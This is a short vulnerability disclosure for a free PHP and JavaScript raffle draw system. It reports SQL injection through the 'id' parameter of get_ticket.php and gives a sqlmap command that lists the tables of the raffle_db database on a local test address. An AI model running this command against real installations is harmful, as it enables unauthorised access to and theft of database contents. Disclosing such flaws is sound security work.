vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/15951/raffle-draw-system-using-php-and-javascript-free-source-code.html

Vulnerability trigger parameter: $id

The process of vulnerability discovery is as follows：
![image](https://user-images.githubusercontent.com/30823782/213211734-5cbc7978-83ed-4ead-bed2-676f8355e4ac.png)

sqlmap.py -u "http://192.168.249.88/php-js-raffle-draw/get_ticket.php" --data "id=1" -D raffle_db --tables

![image](https://user-images.githubusercontent.com/30823782/213211813-0db3eb5d-8955-4501-ab23-a722a846cedd.png)
